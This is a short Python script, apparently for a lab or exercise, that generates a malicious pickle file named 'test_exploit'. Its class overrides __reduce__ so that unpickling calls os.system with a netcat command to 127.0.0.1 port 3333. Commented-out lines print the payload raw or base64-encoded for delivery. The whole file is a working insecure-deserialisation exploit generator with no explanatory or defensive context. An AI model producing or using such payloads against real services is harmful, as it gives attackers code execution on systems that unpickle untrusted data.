import pickle
import subprocess
import base64
import os

class RunBinSh(object):
    def __reduce__(self):
        return (os.system,("nc 127.0.0.1 3333 | ls",))

with open("test_exploit", 'wb') as output:
    pickle.dump(RunBinSh(), output, pickle.HIGHEST_PROTOCOL)
#print(pickle.dumps(RunBinSh()))
#print(base64.b64encode(pickle.dumps(RunBinSh())))
